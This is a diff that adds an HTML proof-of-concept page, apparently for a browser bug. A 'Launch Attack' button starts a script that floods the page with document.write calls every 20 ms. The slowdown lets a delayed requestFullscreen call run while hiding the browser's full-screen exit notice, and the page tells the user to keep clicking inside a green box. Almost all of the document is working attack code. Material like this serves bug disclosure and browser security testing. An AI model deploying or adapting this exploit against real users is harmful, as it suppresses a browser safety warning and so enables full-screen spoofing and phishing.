@@ -1,0 +1,90 @@
+<html>
+<head>
+
+<meta http-equiv="Content-Type" 
+content="text/html; charset=windows-1252">
+        
+<meta name="viewport" content="width=device-width, 
+initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+<title>Slow full screen code / Hide escape bubble</title>
+
+  <style>
+  input[type=text] {
+  width: 100%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  box-sizing: border-box;
+  border: 3px solid green;
+  -webkit-transition: 0.5s;
+  transition: 0.5s;
+  outline: none;
+ }
+
+ input[type=text]:focus {
+  border: 3px solid green;
+ }
+
+ input,
+ input::placeholder {
+    font: 1.25rem/3 sans-serif;
+	float:center;
+  }
+	</style>
+		
+    </head>
+
+<body>
+    
+    <h2>This Demo Slows Down Code / Preventing Full Screen Bubble From Showing </h2>
+
+     <input type="text" class="input-box" style="height:200px;width:1000px;margin-top:0px;" id="text" name="text" onclick="" value="" placeholder="CLICK LAUNCH ATTACK BUTTON BELLOW"/> 
+     </br></br>
+	 <input type="submit" value="Launch Attack" onclick="launchAttack()"/>
+	 
+
+
+<script>
+  var isRun = true;
+  
+  function launchAttack(){
+
+  setTimeout(function(){
+  document.documentElement.requestFullscreen();  
+  }, 7000);
+  
+  setTimeout(function(){
+    setInterval(function(){
+	doc();	 
+	}, 20);
+ 
+  }, 1000);
+
+
+function doc(){
+document.open();
+document.write('<iframe src="#" height="0%" width="0%"></iframe>');
+document.write('<input type="text" class="input-box" style="height:100px;width:10000000px;margin-top:0px;" id="text" name="text" onclick="" value="" autocomplete="on" placeholder="CLICK HERE 4-5 TIMES AND LET THE MOUSE POINTER REMAIN WITHIN THE GREEN BOX">');
+document.write('<style> input[type=text] { width: 100%; padding: 12px 20px; margin: 8px 0; box-sizing: border-box; border: 3px solid green; -webkit-transition: 0.5s; transition: 0.5s; outline: none;} input[type=text]:focus {  border: 3px solid green;}input,input::placeholder {font: 1.25rem/3 sans-serif;float:center;}</style>');
+document.close();
+}
+
+function call(){
+    setInterval(function(){
+	if(isRun){
+	 document.getElementById("text").focus();
+	 document.getElementById("text").click();
+	}
+ }, 20);
+}
+  
+  
+  setTimeout(function(){
+   isRun = false;
+  }, 30000);
+  }
+  
+</script>
+    
+
+</body>
+</html>
